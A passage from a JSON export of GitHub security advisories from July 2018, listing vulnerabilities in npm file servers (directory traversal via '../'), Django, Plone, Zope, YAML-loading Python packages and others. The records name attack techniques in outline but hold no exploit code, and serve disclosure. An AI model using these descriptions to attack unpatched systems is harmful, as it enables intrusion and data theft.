    "description": "commentapp.stetsonwood is an http server. commentapp.stetsonwood is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects commentapp.stetsonwood"
  },
  {
    "ghsaId": "GHSA-rgq8-25qc-h54q",
    "publishedAt": "2018-07-23T20:48:05Z",
    "description": "myserver.alexcthomas18 is a file server. myserver.alexcthomas18 is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects myserver.alexcthomas18"
  },
  {
    "ghsaId": "GHSA-ggq8-j54v-54x8",
    "publishedAt": "2018-07-23T20:47:02Z",
    "description": "sspa is a server dedicated to single-page apps. sspa is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects sspa"
  },
  {
    "ghsaId": "GHSA-vgjp-vh3c-32v3",
    "publishedAt": "2018-07-23T20:46:55Z",
    "description": "mockserve is a file server. mockserve is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects mockserve"
  },
  {
    "ghsaId": "GHSA-9j5m-873f-xh76",
    "publishedAt": "2018-07-23T20:46:32Z",
    "description": "static-html-server is a static file server. static-html-server is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects static-html-server"
  },
  {
    "ghsaId": "GHSA-9frq-f867-hgqc",
    "publishedAt": "2018-07-23T20:46:25Z",
    "description": "fast-http-cli is the command line interface for fast-http, a simple web server. fast-http-cli is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects fast-http-cli"
  },
  {
    "ghsaId": "GHSA-776r-w3v9-96mv",
    "publishedAt": "2018-07-23T20:46:16Z",
    "description": "censorify.tanisjr is a simple web server and API RESTful service. censorify.tanisjr is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects censorify.tanisjr"
  },
  {
    "ghsaId": "GHSA-rrfc-g2gh-xvjm",
    "publishedAt": "2018-07-23T20:46:07Z",
    "description": "22lixian is a simple file server. 22lixian is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects 22lixian"
  },
  {
    "ghsaId": "GHSA-756f-6j3f-48q9",
    "publishedAt": "2018-07-23T20:45:51Z",
    "description": "calmquist.static-server is a static file server. calmquist.static-server is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects calmquist.static-server"
  },
  {
    "ghsaId": "GHSA-hhff-3c89-5m7p",
    "publishedAt": "2018-07-23T20:45:42Z",
    "description": "byucslabsix is an http server. byucslabsix is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects byucslabsix"
  },
  {
    "ghsaId": "GHSA-4vfj-c2xf-8r48",
    "publishedAt": "2018-07-23T20:45:20Z",
    "description": "looppake is a simple http server. looppake is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects looppake"
  },
  {
    "ghsaId": "GHSA-68cm-mgv7-vg5c",
    "publishedAt": "2018-07-23T20:45:11Z",
    "description": "utahcityfinder constructs lists of Utah cities with a certain prefix. utahcityfinder is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects utahcityfinder"
  },
  {
    "ghsaId": "GHSA-m874-69ww-w7jq",
    "publishedAt": "2018-07-23T20:45:01Z",
    "description": "whispercast is a file server. whispercast is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects whispercast"
  },
  {
    "ghsaId": "GHSA-5x5w-v4xq-p64r",
    "publishedAt": "2018-07-23T20:44:52Z",
    "description": "ewgaddis.lab6 is a file server. ewgaddis.lab6 is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects ewgaddis.lab6"
  },
  {
    "ghsaId": "GHSA-23wc-v4mf-x7v4",
    "publishedAt": "2018-07-23T20:44:45Z",
    "description": "intsol-package is a file server. intsol-package is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects intsol-package"
  },
  {
    "ghsaId": "GHSA-pr49-5hhf-6mm6",
    "publishedAt": "2018-07-23T20:44:34Z",
    "description": "serverabc is a static file server. serverabc is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects serverabc"
  },
  {
    "ghsaId": "GHSA-wh33-4p32-g7vh",
    "publishedAt": "2018-07-23T20:43:56Z",
    "description": "serverxxx is a static file server. serverxxx is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects serverxxx"
  },
  {
    "ghsaId": "GHSA-jpjp-vxv6-59hm",
    "publishedAt": "2018-07-23T20:41:11Z",
    "description": "open-device creates a web interface for any device. open-device is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects open-device"
  },
  {
    "ghsaId": "GHSA-f7jg-mcvw-9gwv",
    "publishedAt": "2018-07-23T20:40:40Z",
    "description": "reecerver is a web server. reecerver is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects reecerver"
  },
  {
    "ghsaId": "GHSA-rw6j-rhw7-q94c",
    "publishedAt": "2018-07-23T20:40:34Z",
    "description": "sly07 is an API for censoring text. sly07 is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects sly07"
  },
  {
    "ghsaId": "GHSA-4vcm-qfxh-p6c3",
    "publishedAt": "2018-07-23T20:40:29Z",
    "description": "getcityapi.yoehoehne is a web server. getcityapi.yoehoehne is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects getcityapi.yoehoehne"
  },
  {
    "ghsaId": "GHSA-x5x2-mfc7-r22f",
    "publishedAt": "2018-07-23T20:40:20Z",
    "description": "picard is a micro framework. picard is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects picard"
  },
  {
    "ghsaId": "GHSA-78h7-fgq9-625x",
    "publishedAt": "2018-07-23T20:40:14Z",
    "description": "quickserver is a simple static file server. quickserver is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects quickserver"
  },
  {
    "ghsaId": "GHSA-79p8-4cwq-rhqh",
    "publishedAt": "2018-07-23T20:40:07Z",
    "description": "jn_jj_server is a static file server. jn_jj_server is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects jn_jj_server"
  },
  {
    "ghsaId": "GHSA-5jg5-w395-9684",
    "publishedAt": "2018-07-23T20:39:59Z",
    "description": "ltt is a static file server. ltt is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects ltt"
  },
  {
    "ghsaId": "GHSA-qmhf-qg6f-pc4v",
    "publishedAt": "2018-07-23T20:39:51Z",
    "description": "fbr-client sends files through sockets via socket.io and webRTC. fbr-client is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects fbr-client"
  },
  {
    "ghsaId": "GHSA-xqfm-ff6g-24c7",
    "publishedAt": "2018-07-23T20:39:44Z",
    "description": "dgard8.lab6 is a static file server. dgard8.lab6 is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects dgard8.lab6"
  },
  {
    "ghsaId": "GHSA-xj3h-vc9j-j823",
    "publishedAt": "2018-07-23T20:39:32Z",
    "description": "nodeaaaaa is a static file server. nodeaaaaa is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing \"../\" in the url.",
    "summary": "High severity vulnerability that affects nodeaaaaa"
  },
  {
    "ghsaId": "GHSA-2qx8-589j-gcpx",
    "publishedAt": "2018-07-23T20:26:45Z",
    "description": "plone.app.users in Plone 4.0 and 4.1 allows remote authenticated users to modify the properties of arbitrary accounts via unspecified vectors, as exploited in the wild in June 2011.",
    "summary": "Moderate severity vulnerability that affects Plone and plone.app.users"
  },
  {
    "ghsaId": "GHSA-fxpg-gg9g-76gj",
    "publishedAt": "2018-07-23T19:52:42Z",
    "description": "Cross-site scripting (XSS) vulnerability in Django 1.2.x before 1.2.2 allows remote attackers to inject arbitrary web script or HTML via a csrfmiddlewaretoken (aka csrf_token) cookie.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-x88j-93vc-wpmp",
    "publishedAt": "2018-07-23T19:52:39Z",
    "description": "django.contrib.sessions in Django before 1.2.7 and 1.3.x before 1.3.1, when session data is stored in the cache, uses the root namespace for both session identifiers and application-data keys, which allows remote attackers to modify a session by triggering use of a key that is equal to that session's identifier.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-prr5-pfr8-q9f3",
    "publishedAt": "2018-07-23T19:52:35Z",
    "description": "ftp.py in Plone before 4.2.3 and 4.3 before beta 1 allows remote attackers to read hidden folder contents via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects Plone"
  },
  {
    "ghsaId": "GHSA-7g9h-c88w-r7h2",
    "publishedAt": "2018-07-23T19:52:31Z",
    "description": "Directory traversal vulnerability in Django 1.1.x before 1.1.4 and 1.2.x before 1.2.5 on Windows might allow remote attackers to read or execute files via a / (slash) character in a key in a session cookie, related to session replays.",
    "summary": "High severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-2p78-8hh6-96xc",
    "publishedAt": "2018-07-23T19:52:21Z",
    "description": "Cross-site scripting (XSS) vulnerability in feedparser.py in Universal Feed Parser (aka feedparser or python-feedparser) 5.x before 5.0.1 allows remote attackers to inject arbitrary web script or HTML via malformed XML comments.",
    "summary": "Moderate severity vulnerability that affects feedparser"
  },
  {
    "ghsaId": "GHSA-879r-7f3w-8jj3",
    "publishedAt": "2018-07-23T19:52:06Z",
    "description": "The App.Undo.UndoSupport.get_request_var_or_attr function in Zope before 2.12.21 and 3.13.x before 2.13.11, as used in Plone before 4.2.3 and 4.3 before beta 1, allows remote authenticated users to gain access to restricted attributes via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects Plone and Zope2"
  },
  {
    "ghsaId": "GHSA-p6h9-hpcg-c6gm",
    "publishedAt": "2018-07-23T19:52:02Z",
    "description": "Unspecified vulnerability in (1) Zope 2.12.x before 2.12.19 and 2.13.x before 2.13.8, as used in Plone 4.x and other products, and (2) PloneHotfix20110720 for Plone 3.x allows attackers to gain privileges via unspecified vectors, related to a \"highly serious vulnerability.\" NOTE: this vulnerability exists because of an incorrect fix for CVE-2011-0720.",
    "summary": "High severity vulnerability that affects Plone and Zope2"
  },
  {
    "ghsaId": "GHSA-7wph-fc4w-wqp2",
    "publishedAt": "2018-07-23T19:51:59Z",
    "description": "The password reset functionality in django.contrib.auth in Django before 1.1.3, 1.2.x before 1.2.4, and 1.3.x before 1.3 beta 1 does not validate the length of a string representing a base36 timestamp, which allows remote attackers to cause a denial of service (resource consumption) via a URL that specifies a large base36 integer.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-77hv-8796-8ccp",
    "publishedAt": "2018-07-23T19:51:50Z",
    "description": "ZPublisher.HTTPRequest._scrubHeader in Zope 2 before 2.13.19, as used in Plone before 4.3 beta 1, allows remote attackers to inject arbitrary HTTP headers via a linefeed (LF) character.",
    "summary": "Moderate severity vulnerability that affects Plone and Zope2"
  },
  {
    "ghsaId": "GHSA-4m72-rmm9-2qjr",
    "publishedAt": "2018-07-23T19:51:43Z",
    "description": "Cross-site scripting (XSS) vulnerability in feedparser.py in Universal Feed Parser (aka feedparser or python-feedparser) 5.x before 5.0.1 allows remote attackers to inject arbitrary web script or HTML via an unexpected URI scheme, as demonstrated by a javascript: URI.",
    "summary": "Moderate severity vulnerability that affects feedparser"
  },
  {
    "ghsaId": "GHSA-fwr5-q9rx-294f",
    "publishedAt": "2018-07-23T19:51:40Z",
    "description": "The administrative interface in django.contrib.admin in Django before 1.1.3, 1.2.x before 1.2.4, and 1.3.x before 1.3 beta 1 does not properly restrict use of the query string to perform certain object filtering, which allows remote authenticated users to obtain sensitive information via a series of requests containing regular expressions, as demonstrated by a created_by__password__regex parameter.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-3jqw-crqj-w8qw",
    "publishedAt": "2018-07-23T19:51:35Z",
    "description": "The verify_exists functionality in the URLField implementation in Django before 1.2.7 and 1.3.x before 1.3.1 relies on Python libraries that attempt access to an arbitrary URL with no timeout, which allows remote attackers to cause a denial of service (resource consumption) via a URL associated with (1) a slow response, (2) a completed TCP connection with no application data sent, or (3) a large amount of application data, a related issue to CVE-2011-1521.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-v7q8-wvvh-c97p",
    "publishedAt": "2018-07-23T19:51:28Z",
    "description": "Cross-site scripting (XSS) vulnerability in Zope 2.8.x before 2.8.12, 2.9.x before 2.9.12, 2.10.x before 2.10.11, 2.11.x before 2.11.6, and 2.12.x before 2.12.3 allows remote attackers to inject arbitrary web script or HTML via vectors related to error messages.",
    "summary": "Moderate severity vulnerability that affects Zope2"
  },
  {
    "ghsaId": "GHSA-h95j-h2rv-qrg4",
    "publishedAt": "2018-07-23T19:51:19Z",
    "description": "The CSRF protection mechanism in Django through 1.2.7 and 1.3.x through 1.3.1 does not properly handle web-server configurations supporting arbitrary HTTP Host headers, which allows remote attackers to trigger unauthenticated forged requests via vectors involving a DNS CNAME record and a web page containing JavaScript code.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-48vv-2pmq-9fvv",
    "publishedAt": "2018-07-23T19:51:14Z",
    "description": "Zope before 2.13.19, as used in Plone before 4.2.3 and 4.3 before beta 1, does not reseed the pseudo-random number generator (PRNG), which makes it easier for remote attackers to guess the value via unspecified vectors.  NOTE: this issue was SPLIT from CVE-2012-5508 due to different vulnerability types (ADT2).",
    "summary": "Moderate severity vulnerability that affects Plone and Zope2"
  },
  {
    "ghsaId": "GHSA-5j2h-h5hg-3wf8",
    "publishedAt": "2018-07-23T19:51:10Z",
    "description": "Django 1.1.x before 1.1.4 and 1.2.x before 1.2.5 does not properly validate HTTP requests that contain an X-Requested-With header, which makes it easier for remote attackers to conduct cross-site request forgery (CSRF) attacks via forged AJAX requests that leverage a \"combination of browser plugins and redirects,\" a related issue to CVE-2011-0447.",
    "summary": "Moderate severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-3qpr-7rmg-73v8",
    "publishedAt": "2018-07-23T19:51:02Z",
    "description": "AccessControl/AuthEncoding.py in Zope before 2.13.19, as used in Plone before 4.2.3 and 4.3 before beta 1, allows remote attackers to obtain passwords via vectors involving timing discrepancies in password validation.",
    "summary": "Moderate severity vulnerability that affects Plone and Zope2"
  },
  {
    "ghsaId": "GHSA-p7h9-vf92-5fj5",
    "publishedAt": "2018-07-23T19:50:57Z",
    "description": "Cross-site scripting (XSS) vulnerability in Plone 4.1 and earlier allows remote attackers to inject arbitrary web script or HTML via a crafted URL.",
    "summary": "Moderate severity vulnerability that affects Products.CMFPlone and Products.PasswordResetTool"
  },
  {
    "ghsaId": "GHSA-pcwm-8jc3-qxvj",
    "publishedAt": "2018-07-23T19:50:52Z",
    "description": "Plone 4.1.3 and earlier computes hash values for form parameters without restricting the ability to trigger hash collisions predictably, which allows remote attackers to cause a denial of service (CPU consumption) by sending many crafted parameters.",
    "summary": "Moderate severity vulnerability that affects Plone"
  },
  {
    "ghsaId": "GHSA-pvhp-v9qp-xf5r",
    "publishedAt": "2018-07-23T19:50:48Z",
    "description": "emitters.py in Django Piston before 0.2.3 and 0.2.x before 0.2.2.1 does not properly deserialize YAML data, which allows remote attackers to execute arbitrary Python code via vectors related to the yaml.load method.\r\n\r\nDjango Tastypie has a very similar vulnerability.",
    "summary": "High severity vulnerability that affects django-piston and django-tastypie"
  },
  {
    "ghsaId": "GHSA-6h52-4vmh-8x4f",
    "publishedAt": "2018-07-23T19:50:33Z",
    "description": "feedparser.py in Universal Feed Parser (aka feedparser or python-feedparser) before 5.0.1 allows remote attackers to cause a denial of service (application crash) via a malformed DOCTYPE declaration.",
    "summary": "Moderate severity vulnerability that affects feedparser"
  },
  {
    "ghsaId": "GHSA-pq3x-96c3-xgjg",
    "publishedAt": "2018-07-23T19:50:29Z",
    "description": "The PlonePAS product 3.x before 3.9 and 3.2.x before 3.2.2, a product for Plone, does not properly handle the login form, which allows remote authenticated users to acquire the identity of an arbitrary user via unspecified vectors.",
    "summary": "Moderate severity vulnerability that affects Products.PlonePAS"
  },
  {
    "ghsaId": "GHSA-69mv-3642-wj3w",
    "publishedAt": "2018-07-23T19:50:22Z",
    "description": "The sensu rubygem prior to version 1.2.0 contains a CWE-522 (Insufficiently Protected Credentials) flaw that can result in sensitive configuration data (e.g. passwords) being logged in clear-text. \r\n\r\nUsers are advised to upgrade to rubygem version 1.2.1 or later.",
    "summary": "Low severity vulnerability that affects sensu"
  },
  {
    "ghsaId": "GHSA-g982-9r8g-6qxw",
    "publishedAt": "2018-07-23T19:50:15Z",
    "description": "chef/travis-cookbooks/ci_environment/perlbrew/recipes/default.rb in the ciborg gem 3.0.0 for Ruby allows local users to write to arbitrary files and gain privileges via a symlink attack on /tmp/perlbrew-installer.",
    "summary": "Low severity vulnerability that affects ciborg"
  },
  {
    "ghsaId": "GHSA-6fcq-3cm2-j3j5",
    "publishedAt": "2018-07-23T19:50:11Z",
    "description": "lib/ksymfony1.rb in the kcapifony gem 2.1.6 for Ruby places database user passwords on the (1) mysqldump, (2) pg_dump, (3) mysql, and (4) psql command lines, which allows local users to obtain sensitive information by listing the processes.",
    "summary": "Low severity vulnerability that affects kcapifony"
  },
  {
    "ghsaId": "GHSA-rvj9-8cvx-3vq9",
    "publishedAt": "2018-07-20T21:10:14Z",
    "description": "node-jose is a JavaScript implementation of the JSON Object Signing and Encryption (JOSE) for current web browsers and node.js-based servers. node-jose earlier than version 0.9.3 is vulnerable to an invalid curve attack. This allows an attacker to recover the private secret key when JWE with Key Agreement with Elliptic Curve Diffie-Hellman Ephemeral Static (ECDH-ES) is used.",
    "summary": "High severity vulnerability that affects node-jose"
  },
  {
    "ghsaId": "GHSA-wrvr-8mpx-r7pp",
    "publishedAt": "2018-07-20T16:20:52Z",
    "description": "The mime module is vulnerable to regular expression denial of service when a mime lookup is performed on untrusted user input.",
    "summary": "High severity vulnerability that affects mime"
  },
  {
    "ghsaId": "GHSA-mq6c-fh97-4gwv",
    "publishedAt": "2018-07-18T21:20:34Z",
    "description": "Fastify node module before 0.38.0 is vulnerable to a denial-of-service attack by sending a request with \"Content-Type: application/json\" and a very large payload.",
    "summary": "High severity vulnerability that affects fastify"
  },
  {
    "ghsaId": "GHSA-rwv8-jvff-jq28",
    "publishedAt": "2018-07-18T21:20:30Z",
    "description": "public node module suffers from a Path Traversal vulnerability due to lack of validation of filePath, which allows a malicious user to read content of any file with known path.",
    "summary": "High severity vulnerability that affects public"
  },
  {
    "ghsaId": "GHSA-62g9-6hw5-rwfp",
    "publishedAt": "2018-07-18T21:20:25Z",
    "description": "resolve-path node module before 1.4.0 suffers from a Path Traversal vulnerability due to lack of validation of paths with certain special characters, which allows a malicious user to read content of any file with known path.",
    "summary": "High severity vulnerability that affects resolve-path"
  },
  {
    "ghsaId": "GHSA-vfp9-gwrh-wq9g",
    "publishedAt": "2018-07-18T21:20:19Z",
    "description": "crud-file-server node module before 0.9.0 suffers from a Path Traversal vulnerability due to incorrect validation of url, which allows a malicious user to read content of any file with known path.",
    "summary": "High severity vulnerability that affects crud-file-server"
  },
  {
    "ghsaId": "GHSA-w4pv-w56c-mg4v",
    "publishedAt": "2018-07-18T21:20:15Z",
    "description": "stattic node module suffers from a Path Traversal vulnerability due to lack of validation of path, which allows a malicious user to read content of any file with known path.",
    "summary": "High severity vulnerability that affects stattic"
  },
  {
    "ghsaId": "GHSA-qmm9-x5gr-4gfm",
    "publishedAt": "2018-07-18T21:20:12Z",
    "description": "Open redirect in hekto <=0.2.3 when target domain name is used as html filename on server.",
    "summary": "High severity vulnerability that affects hekto"
  },
  {
    "ghsaId": "GHSA-h24f-9mm4-w336",
    "publishedAt": "2018-07-18T18:34:27Z",
    "description": "crud-file-server node module before 0.8.0 suffers from a Cross-Site Scripting vulnerability to a lack of validation of file names.",
    "summary": "Critical severity vulnerability that affects crud-file-server"
  },
  {
    "ghsaId": "GHSA-686g-3xr3-x4x6",
    "publishedAt": "2018-07-18T18:33:15Z",
    "description": "Information exposure through directory listings in serve 6.5.3 allows directory listing and file access even when they have been set to be ignored.",
    "summary": "High severity vulnerability that affects serve"
  },
  {
    "ghsaId": "GHSA-m85c-9mf8-m2m6",
    "publishedAt": "2018-07-18T18:28:26Z",
    "description": "An exploitable vulnerability exists in the YAML parsing functionality in config.py in Confire 0.2.0. Due to the user-specific configuration being loaded from \"~/.confire.yaml\" using the yaml.load function, a YAML parser can execute arbitrary Python commands resulting in command execution. An attacker can insert Python into loaded YAML to trigger this vulnerability.",
    "summary": "Critical severity vulnerability that affects confire"
  },
  {
    "ghsaId": "GHSA-85fq-56wq-gmcf",
    "publishedAt": "2018-07-18T18:28:17Z",
    "description": "`mariadb` was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Critical severity vulnerability that affects mariadb"
  },
  {
    "ghsaId": "GHSA-ww6v-677g-p656",
    "publishedAt": "2018-07-18T18:28:10Z",
    "description": "The safe-eval module describes itself as a safer version of eval. By accessing the object constructors, un-sanitized user input can access the entire standard library and effectively break out of the sandbox.",
    "summary": "Critical severity vulnerability that affects safe-eval"
  },
  {
    "ghsaId": "GHSA-jcw8-r9xm-32c6",
    "publishedAt": "2018-07-18T18:28:02Z",
    "description": "dns-sync is a sync/blocking dns resolver. If untrusted user input is allowed into the resolve() method then command injection is possible.",
    "summary": "Critical severity vulnerability that affects dns-sync"
  },
  {
    "ghsaId": "GHSA-q4v7-4rhw-9hqm",
    "publishedAt": "2018-07-18T18:27:56Z",
    "description": "An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the unserialize() function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).",
    "summary": "Critical severity vulnerability that affects node-serialize"
  },
  {
    "ghsaId": "GHSA-mm62-wxc8-cf7m",
    "publishedAt": "2018-07-18T18:27:41Z",
    "description": "An issue was discovered in the serialize-to-js package 0.5.0 for Node.js. Untrusted data passed into the deserialize() function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).",
    "summary": "Critical severity vulnerability that affects serialize-to-js"
  },
  {
    "ghsaId": "GHSA-cq94-qf6q-mf2h",
    "publishedAt": "2018-07-16T16:50:30Z",
    "description": "Python package pysaml2 version 4.4.0 and earlier reuses the initialization vector across encryptions in the IDP server, resulting in weak encryption of data.",
    "summary": "Moderate severity vulnerability that affects pysaml2"
  },
  {
    "ghsaId": "GHSA-c2vx-49jm-h3f6",
    "publishedAt": "2018-07-16T16:50:12Z",
    "description": "XML External Entity (XXE) vulnerability in PySAML2 4.4.0 and earlier allows remote attackers to read arbitrary files via a crafted SAML XML request or response.",
    "summary": "Moderate severity vulnerability that affects pysaml2"
  },
  {
    "ghsaId": "GHSA-gcr6-rf47-jrgf",
    "publishedAt": "2018-07-13T16:01:25Z",
    "description": "An exploitable vulnerability exists in the Databook loading functionality of Tablib 0.11.4. A yaml loaded Databook can execute arbitrary python commands resulting in command execution. An attacker can insert python into loaded yaml to trigger this vulnerability.",
    "summary": "High severity vulnerability that affects tablib"
  },
  {
    "ghsaId": "GHSA-8p5c-f328-9fvv",
    "publishedAt": "2018-07-13T16:01:21Z",
    "description": "diffoscope before 77 writes to arbitrary locations on disk based on the contents of an untrusted archive.",
    "summary": "Moderate severity vulnerability that affects diffoscope"
  },
  {
    "ghsaId": "GHSA-924m-4pmx-c67h",
    "publishedAt": "2018-07-13T16:01:17Z",
    "description": "pysaml2 version 4.4.0 and older accept any password when run with python optimizations enabled. This allows attackers to log in as any user without knowing their password.",
    "summary": "High severity vulnerability that affects pysaml2"
  },
  {
    "ghsaId": "GHSA-ccmq-qvcp-5mrm",
    "publishedAt": "2018-07-13T16:01:12Z",
    "description": "An exploitable vulnerability exists in the YAML loading functionality of util.py in OwlMixin before 2.0.0a12. A \"Load YAML\" string or file (aka load_yaml or load_yamlf) can execute arbitrary Python commands resulting in command execution because load is used where safe_load should have been used. An attacker can insert Python into loaded YAML to trigger this vulnerability.",
    "summary": "Critical severity vulnerability that affects owlmixin"
  },
  {
    "ghsaId": "GHSA-xpm8-98mx-h4c5",
    "publishedAt": "2018-07-13T16:01:07Z",
    "description": "An exploitable vulnerability exists in the YAML parsing functionality in the parse_yaml_query method in parser.py in MLAlchemy before 0.2.2. When processing YAML-Based queries for data, a YAML parser can execute arbitrary Python commands resulting in command execution because load is used where safe_load should have been used. An attacker can insert Python into loaded YAML to trigger this vulnerability.",
    "summary": "Critical severity vulnerability that affects MLAlchemy"
  },
  {
    "ghsaId": "GHSA-5mc5-5j6c-qmf9",
    "publishedAt": "2018-07-13T16:01:01Z",
    "description": "An issue was discovered in cloudflare-scrape 1.6.6 through 1.7.1. A malicious website owner could craft a page that executes arbitrary Python code against any cfscrape user who scrapes that website. This is fixed in 1.8.0.",
    "summary": "High severity vulnerability that affects cfscrape"
  },
  {
    "ghsaId": "GHSA-xp5m-4c9f-498q",
    "publishedAt": "2018-07-13T15:17:18Z",
    "description": "There is a cross-site scripting vulnerability in django-epiceditor 0.2.3 via crafted content in a form field.",
    "summary": "Moderate severity vulnerability that affects django-epiceditor"
  },
  {
    "ghsaId": "GHSA-p7xc-35m8-57pr",
    "publishedAt": "2018-07-13T15:17:14Z",
    "description": "FedMsg 0.18.1 and older is vulnerable to a message validation flaw resulting in message validation not being enabled if configured to be on.",
    "summary": "Moderate severity vulnerability that affects FedMsg"
  },
  {
    "ghsaId": "GHSA-ghjx-3jg5-h6r2",
    "publishedAt": "2018-07-13T15:17:10Z",
    "description": "In Mercurial before 4.1.3, \"hg serve --stdio\" allows remote authenticated users to launch the Python debugger, and consequently execute arbitrary code, by using --debugger as a repository name.",
    "summary": "High severity vulnerability that affects mercurial"
  },
  {
    "ghsaId": "GHSA-m242-wc86-8768",
    "publishedAt": "2018-07-13T15:17:05Z",
    "description": "python-fedora 0.8.0 and lower is vulnerable to an open redirect resulting in loss of CSRF protection",
    "summary": "Moderate severity vulnerability that affects python-fedora"
  },
  {
    "ghsaId": "GHSA-9pv8-q5rx-c8gq",
    "publishedAt": "2018-07-13T15:16:59Z",
    "description": "An exploitable vulnerability exists in the YAML parsing functionality in the read_yaml_file method in io_utils.py in django_make_app 0.1.3. A YAML parser can execute arbitrary Python commands resulting in command execution. An attacker can insert Python into loaded YAML to trigger this vulnerability.",
    "summary": "Critical severity vulnerability that affects django_make_app"
  },
  {
    "ghsaId": "GHSA-c2w9-48qc-qpj4",
    "publishedAt": "2018-07-13T15:16:54Z",
    "description": "An exploitable vulnerability exists in the yaml loading functionality of ansible-vault before 1.0.5. A specially crafted vault can execute arbitrary python commands resulting in command execution. An attacker can insert python into the vault to trigger this vulnerability.",
    "summary": "High severity vulnerability that affects ansible"
  },
  {
    "ghsaId": "GHSA-xcp8-hh74-f6mc",
    "publishedAt": "2018-07-13T15:16:45Z",
    "description": "python-oslo-middleware before versions 3.8.1, 3.19.1, 3.23.1 is vulnerable to an information disclosure. Software using the CatchError class could include sensitive values in a traceback's error message. System users could exploit this flaw to obtain sensitive information from OpenStack component error logs (for example, keystone tokens).",
    "summary": "Moderate severity vulnerability that affects oslo.middleware"
  },
  {
    "ghsaId": "GHSA-32pc-xphx-q4f6",
    "publishedAt": "2018-07-12T20:30:49Z",
    "description": "gunicorn version 19.4.5 contains a CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers vulnerability in \"process_headers\" function in \"gunicorn/http/wsgi.py\" that can result in an attacker causing the server to return arbitrary HTTP headers. This vulnerability appears to have been fixed in 19.5.0.\r\n",
    "summary": "Moderate severity vulnerability that affects gunicorn"
  },
  {
    "ghsaId": "GHSA-cwh5-3cw7-4286",
    "publishedAt": "2018-07-12T20:30:44Z",
    "description": "tlslite-ng version 0.7.3 and earlier, since commit d7b288316bca7bcdd082e6ccff5491e241305233 contains a CWE-354: Improper Validation of Integrity Check Value vulnerability in TLS implementation, tlslite/utils/constanttime.py: ct_check_cbc_mac_and_pad(); line \"end_pos = data_len - 1 - mac.digest_size\" that can result in an attacker manipulating the TLS ciphertext which will not be detected by receiving tlslite-ng. This attack appears to be exploitable via man in the middle on a network connection. This vulnerability appears to have been fixed after commit 3674815d1b0f7484454995e2737a352e0a6a93d8.",
    "summary": "Moderate severity vulnerability that affects tlslite-ng"
  },
  {
    "ghsaId": "GHSA-hxf9-7h4c-f5jv",
    "publishedAt": "2018-07-12T20:30:40Z",
